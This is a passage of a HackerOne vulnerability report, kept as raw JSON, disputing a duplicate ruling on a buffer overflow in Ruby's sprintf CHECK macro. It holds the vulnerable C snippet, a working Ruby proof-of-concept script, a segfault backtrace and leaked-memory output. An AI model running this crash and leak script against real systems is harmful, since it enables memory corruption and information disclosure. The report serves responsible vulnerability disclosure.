Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-19T04:57:24.492Z","allow_singular_disclosure_after":-100828784.15345335,"singular_disclosure_allowed":true,"vote_count":18,"voters":["flamezzz","heeeeen","mik317","fa1rlight","eveeez","khizer47","luckydivino","mr_r3boot","plazmaz","zerotoone","and 8 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1536638,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-13T06:59:15.566Z","updated_at":"2017-03-13T06:59:15.566Z","original_report_id":211190,"actor":{"username":"nobu","cleared":false,"url":"/nobu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1536647,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is NOT a duplicate, unless my second report will be treated as an overall report for the sprintf module.\n\nThis report describes an additional problem in the CHECK macro (parallel to the one originally reported, and that was fixed in MRuby) + a problem in the use of the libc snprintf method, which has no connection to my previous report.\n\nI would like to know why was this report classified as a duplicate.","markdown_message":"\u003cp\u003eThis is NOT a duplicate, unless my second report will be treated as an overall report for the sprintf module.\u003c/p\u003e\n\n\u003cp\u003eThis report describes an additional problem in the CHECK macro (parallel to the one originally reported, and that was fixed in MRuby) + a problem in the use of the libc snprintf method, which has no connection to my previous report.\u003c/p\u003e\n\n\u003cp\u003eI would like to know why was this report classified as a duplicate.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-13T07:04:40.082Z","updated_at":"2017-03-13T07:04:40.082Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1612979,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I saw that you merged my fix from MRuby to CRuby regarding the 1st issue in the CHECK() macro. However, even this macro has vulnerabilities, as I clearly mentioned in initial report:\n\n```cpp\n#define CHECK(l) do {\\\n/*  int cr = ENC_CODERANGE(result);*/\\\n  while ((l) \u003e= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n/*  ENC_CODERANGE_SET(result, cr);*/\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n```\n\nFor example, this code snippet can reach a negative \"l\" parameter for the CHECK(l) macro, resulting in a small buffer overflow when writing the NaN/Inf expression:\n```cpp\n   if ((flags \u0026 FWIDTH) \u0026\u0026 need \u003c width)\n\tneed = width;\n\n  CHECK(need + 1);\n  snprintf(\u0026buf[blen], need + 1, \"%*s\", need, \"\");\n  if (flags \u0026 FMINUS) {\n\tif (!isnan(fval) \u0026\u0026 fval \u003c 0.0)\n\t\t buf[blen++] = '-';\n\telse if (flags \u0026 FPLUS)\n\t\t buf[blen++] = '+';\n\telse if (flags \u0026 FSPACE)\n\t\tblen++;\n\tmemcpy(\u0026buf[blen], expr, strlen(expr));\n  }\n```\n\nThe following script demonstrates the damage: buffer overflow that leads to memory corruption and information leakage.\n```ruby\nlength = 120 * 4 - 1\nbase_format = \"%*G\"\narg1 = -1 * (2 ** 31 - 1)\narg2 = -1.0 / 0\n\ni = 1\n\nwhile i \u003c 10 ** 5  do\n\ts1 = sprintf('1' * length + base_format, arg1, arg2)\n\tputs s1[-5, 10]\n\n\ts2 = sprintf('2' * length + base_format * 2, arg1, arg2, arg1, arg2)\n\ts2[-20, 20]\n\n\ts3 = sprintf('3' * length + base_format * 3, arg1, arg2, arg1, arg2, arg1, arg2)\n\ts3[-20, 20]\n\n\ts8 = sprintf('8' * length + base_format * 8, arg1, arg2, arg1, arg2, arg1, arg2, arg1, arg2, arg1, arg2, arg1, arg2, arg1, arg2, arg1, arg2)\n\ts8[-20, 20]\n\t\n\ti += 1\nend\n\nputs s1\nputs s2\nputs s3\nputs s8\n```\nAnd here are last parts of several outputs when running on a 64 bit machine using ruby 2.3.3 (tested on 32 bit machine running 2.4.0 too):\n```\n1-Inf\n1-Inf\n1-IG\n1-Inf\n1-I\n1-I\n1-Inf\n1-I\n1-Inf\n1-I\nIG *G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf G\nInf*G\nInf*G\nIG *G\nInf*G\nIG *G\nInf*G\n33333\nInf11\nInff-\n\nf-Inf\n88888\nruby_poc.rb:15: [BUG] Segmentation fault\nruby 2.3.3p222 (2016-11-21 revision 56859) [x64-mingw32]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0019 e:000018 CFUNC  :sprintf\nc:0002 p:0096 s:0013 E:0018b8 EVAL   ruby_poc.rb:15 [FINISH]\nc:0001 p:0000 s:0002 E:0009a0 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nruby_poc.rb:15:in `\u003cmain\u003e'\nruby_poc.rb:15:in `sprintf'\n\n-- C level backtrace information -------------------------------------------\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(NtWaitForSingleObject+0x14) [0x00007FFF5FF56154]\nC:\\WINDOWS\\System32\\KERNELBASE.dll(WaitForSingleObjectEx+0x8f) [0x00007FFF5CEC3ACF]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_vm_bugreport+0xa4) [0x000000006E6AF354]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_bug_context+0x68) [0x000000006E54B6B8]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_check_safe_obj+0x3b2) [0x000000006E61E522]\n [0x0000000000401A85]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(_C_specific_handler+0x96) [0x00007FFF5FF46BD6]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(_chkstk+0x11d) [0x00007FFF5FF5AB9D]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(RtlImageNtHeaderEx+0x483) [0x00007FFF5FEF9913]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(KiUserExceptionDispatcher+0x3a) [0x00007FFF5FF59CBA]\nC:\\WINDOWS\\System32\\msvcrt.dll(strlen+0x31) [0x00007FFF5DE4C981]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_str_format+0x16ba) [0x000000006E623F6A]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_error_arity+0x1fb) [0x000000006E697D1B]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_vm_localjump_error+0xe11) [0x000000006E69E9B1]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_vm_localjump_error+0x5788) [0x000000006E6A3328]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_check_copyable+0x2dc1) [0x000000006E5509B1]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(ruby_run_node+0x51) [0x000000006E553951]\n [0x0000000000402D14]\n [0x00000000004013D7]\n [0x00000000004014F8]\nC:\\WINDOWS\\System32\\KERNEL32.DLL(BaseThreadInitThunk+0x14) [0x00007FFF5FD08364]\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ruby_poc.rb\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n    4 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/enc/encdb.so\n    5 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/enc/trans/transdb.so\n    6 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/enc/iso_8859_8.so\n    7 C:/Ruby23-x64/lib/ruby/2.3.0/unicode_normalize.rb\n    8 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/rbconfig.rb\n    9 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/compatibility.rb\n   10 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/defaults.rb\n   11 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/deprecate.rb\n   12 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/errors.rb\n   13 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/version.rb\n   14 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/requirement.rb\n   15 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/platform.rb\n   16 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/basic_specification.rb\n   17 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/stub_specification.rb\n   18 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/util/list.rb\n   19 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/stringio.so\n   20 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/specification.rb\n   21 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/exceptions.rb\n   22 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/defaults/operating_system.rb\n   23 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/dependency.rb\n   24 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb\n   25 C:/Ruby23-x64/lib/ruby/2.3.0/monitor.rb\n   26 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb\n   27 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems.rb\n   28 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/path_support.rb\n   29 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb\n   30 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb\n   31 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb\n   32 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb\n   33 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb\n   34 C:/Ruby23-x64/lib/ruby/2.3.0/delegate.rb\n   35 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb\n   36 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb\n   37 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb\n   38 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb\n   39 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb\n   40 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb\n   41 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb\n\n[NOTE]\n```\n\nAnd this clear information disclosure:\n```\nInf*G\nInf*G\nIG *G\nIG%*G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf*G\nIG *G\nIG *G\nInf*G\nInf*G\nInf*G\nIG%*G\nInf*G\nInf*G\nIG%*G\nIG *G\nIG *G\nIG%*G\nIG *G\nIG *G\nIG *G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nIG *G\nIG *G\nIG%*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nIG *G\nIG *G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nIG%*G\nIG%*G\nInf*G\n11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111-Inf*G\n22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I  -I-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-\n33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-I  -I-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-InfInf-Inf-Inf-\n88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I  -I-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf˶s�-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�Q       �-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-InfInf111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111%*G-Inf-Inf�-Inf888888888888888888888888888888888888888888888888-Inf33333333333-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-\\}\u0002�I\u0016-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�P\u000f�-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-I